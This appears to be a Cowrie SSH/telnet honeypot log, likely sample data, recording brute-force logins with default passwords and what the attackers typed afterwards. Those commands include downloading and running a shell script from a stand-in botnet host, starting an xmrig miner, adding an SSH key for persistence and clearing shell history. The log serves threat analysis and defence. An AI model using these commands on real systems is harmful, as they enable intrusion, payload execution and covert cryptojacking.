+{"timestamp": "2026-11-05T05:09:42.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-05T05:09:58.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-05T05:10:02.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-05T05:10:21.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 56.3}
+{"timestamp": "2026-11-05T09:41:00.000000Z", "src_ip": "198.51.100.29", "session": "c2ce247e", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 58890, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-05T09:41:00.000000Z", "src_ip": "198.51.100.29", "session": "c2ce247e", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-05T09:41:00.000000Z", "src_ip": "198.51.100.29", "session": "c2ce247e", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T09:41:02.000000Z", "src_ip": "198.51.100.29", "session": "c2ce247e", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "ubuntu"}
+{"timestamp": "2026-11-05T09:41:39.000000Z", "src_ip": "198.51.100.29", "session": "c2ce247e", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 83.9}
+{"timestamp": "2026-11-05T13:13:00.000000Z", "src_ip": "198.51.100.53", "session": "647f770c", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 56402, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-05T13:13:00.000000Z", "src_ip": "198.51.100.53", "session": "647f770c", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-05T13:13:00.000000Z", "src_ip": "198.51.100.53", "session": "647f770c", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-05T13:13:02.000000Z", "src_ip": "198.51.100.53", "session": "647f770c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "ubuntu"}
+{"timestamp": "2026-11-05T13:13:05.000000Z", "src_ip": "198.51.100.53", "session": "647f770c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "root"}
+{"timestamp": "2026-11-05T13:13:06.000000Z", "src_ip": "198.51.100.53", "session": "647f770c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "password"}
+{"timestamp": "2026-11-05T13:15:00.000000Z", "src_ip": "198.51.100.53", "session": "647f770c", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 69.7}
+{"timestamp": "2026-11-05T14:04:00.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 41855, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T14:04:00.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-05T14:04:00.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-05T14:04:04.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "password"}
+{"timestamp": "2026-11-05T14:04:09.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "ubuntu"}
+{"timestamp": "2026-11-05T14:04:11.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "oracle", "password": "123456"}
+{"timestamp": "2026-11-05T14:04:20.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-05T14:04:33.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-05T14:04:45.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-05T14:04:58.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-05T14:06:10.000000Z", "src_ip": "203.0.113.106", "session": "1bc1ef63", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 97.7}
+{"timestamp": "2026-11-05T14:13:00.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 53879, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-05T14:13:02.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "root"}
+{"timestamp": "2026-11-05T14:13:04.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "password"}
+{"timestamp": "2026-11-05T14:13:05.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "user", "password": "12345678"}
+{"timestamp": "2026-11-05T14:13:14.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-05T14:13:34.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-05T14:13:41.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-05T14:13:49.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-05T14:14:33.000000Z", "src_ip": "198.51.100.13", "session": "36c4930a", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 13.1}
+{"timestamp": "2026-11-05T14:30:00.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 45712, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-05T14:30:00.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-05T14:30:00.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T14:30:04.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "password"}
+{"timestamp": "2026-11-05T14:30:12.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-05T14:30:23.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-05T14:30:41.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-05T14:30:53.000000Z", "src_ip": "198.51.100.21", "session": "1e261aee", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 10.4}
+{"timestamp": "2026-11-05T15:15:00.000000Z", "src_ip": "198.51.100.13", "session": "a9374236", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 56448, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-05T15:15:01.000000Z", "src_ip": "198.51.100.13", "session": "a9374236", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-05T15:15:03.000000Z", "src_ip": "198.51.100.13", "session": "a9374236", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "12345678"}
+{"timestamp": "2026-11-05T15:15:05.000000Z", "src_ip": "198.51.100.13", "session": "a9374236", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "admin"}
+{"timestamp": "2026-11-05T15:15:10.000000Z", "src_ip": "198.51.100.13", "session": "a9374236", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "12345678"}
+{"timestamp": "2026-11-05T15:17:07.000000Z", "src_ip": "198.51.100.13", "session": "a9374236", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 61.8}
+{"timestamp": "2026-11-05T15:41:00.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 56351, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T15:41:00.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-05T15:41:00.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-05T15:41:01.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "git", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-05T15:41:12.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-05T15:41:32.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-05T15:41:39.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-05T15:41:43.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-05T15:41:43.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-05T15:42:39.000000Z", "src_ip": "203.0.113.125", "session": "39ed92cc", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 21.5}
+{"timestamp": "2026-11-05T15:57:00.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 42292, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T15:57:00.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-05T15:57:00.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-05T15:57:05.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "12345678"}
+{"timestamp": "2026-11-05T15:57:06.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-05T15:57:10.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "raspberry"}
+{"timestamp": "2026-11-05T15:57:12.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "postgres", "password": "admin"}
+{"timestamp": "2026-11-05T15:57:29.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-05T15:57:37.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-05T15:59:01.000000Z", "src_ip": "198.51.100.25", "session": "276258c7", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 45.8}
+{"timestamp": "2026-11-05T16:24:00.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 50857, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T16:24:00.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-05T16:24:00.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T16:24:04.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "root"}
+{"timestamp": "2026-11-05T16:24:05.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "postgres", "password": "raspberry"}
+{"timestamp": "2026-11-05T16:24:10.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-05T16:24:29.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-05T16:24:48.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-05T16:25:23.000000Z", "src_ip": "198.51.100.12", "session": "17b0a8a2", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 41.4}
+{"timestamp": "2026-11-05T17:17:00.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 35774, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-05T17:17:00.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-05T17:17:00.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-05T17:17:04.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "ubuntu"}
+{"timestamp": "2026-11-05T17:17:05.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "root"}
+{"timestamp": "2026-11-05T17:17:06.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "ubuntu"}
+{"timestamp": "2026-11-05T17:17:10.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "git", "password": "password"}
+{"timestamp": "2026-11-05T17:17:11.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-05T17:17:29.000000Z", "src_ip": "203.0.113.105", "session": "feb3bf49", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 60.6}
+{"timestamp": "2026-11-05T17:36:00.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 47111, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T17:36:00.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-05T17:36:00.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-05T17:36:02.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "pi", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-05T17:36:07.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-05T17:36:16.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-05T17:36:30.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-05T17:36:34.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-05T17:36:34.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-05T17:36:45.000000Z", "src_ip": "198.51.100.45", "session": "262ea415", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 53.4}
+{"timestamp": "2026-11-05T19:57:00.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 52184, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T19:57:00.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-05T19:57:00.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T19:57:04.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "password"}
+{"timestamp": "2026-11-05T19:57:05.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "raspberry"}
+{"timestamp": "2026-11-05T19:57:06.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "test", "password": "12345678"}
+{"timestamp": "2026-11-05T19:57:17.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-05T19:57:32.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-05T19:57:47.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-05T19:59:04.000000Z", "src_ip": "203.0.113.120", "session": "c2b13eac", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 44.8}
+{"timestamp": "2026-11-05T20:10:00.000000Z", "src_ip": "203.0.113.115", "session": "24a64615", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 32359, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T20:10:00.000000Z", "src_ip": "203.0.113.115", "session": "24a64615", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-05T20:10:00.000000Z", "src_ip": "203.0.113.115", "session": "24a64615", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T20:10:03.000000Z", "src_ip": "203.0.113.115", "session": "24a64615", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "admin", "password": "raspberry"}
+{"timestamp": "2026-11-05T20:10:16.000000Z", "src_ip": "203.0.113.115", "session": "24a64615", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-05T20:10:26.000000Z", "src_ip": "203.0.113.115", "session": "24a64615", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-05T20:10:31.000000Z", "src_ip": "203.0.113.115", "session": "24a64615", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 54.3}
+{"timestamp": "2026-11-05T20:19:00.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 50354, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T20:19:00.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-05T20:19:00.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T20:19:02.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "qwerty"}
+{"timestamp": "2026-11-05T20:19:03.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "password"}
+{"timestamp": "2026-11-05T20:19:08.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "qwerty"}
+{"timestamp": "2026-11-05T20:19:09.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "qwerty"}
+{"timestamp": "2026-11-05T20:19:17.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-05T20:19:26.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-05T20:19:38.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-05T20:20:07.000000Z", "src_ip": "198.51.100.11", "session": "e895c151", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 83.9}
+{"timestamp": "2026-11-06T00:06:00.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 45992, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T00:06:00.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T00:06:00.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T00:06:02.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "ubuntu"}
+{"timestamp": "2026-11-06T00:06:06.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-06T00:06:11.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "test", "password": "raspberry"}
+{"timestamp": "2026-11-06T00:06:27.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-06T00:06:29.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-06T00:06:31.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-06T00:06:45.000000Z", "src_ip": "198.51.100.14", "session": "1d1353f7", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 23.5}
+{"timestamp": "2026-11-06T02:53:00.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 38353, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T02:53:00.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-06T02:53:00.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-06T02:53:02.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "password"}
+{"timestamp": "2026-11-06T02:53:06.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "qwerty"}
+{"timestamp": "2026-11-06T02:53:07.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "user", "password": "root"}
+{"timestamp": "2026-11-06T02:53:18.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
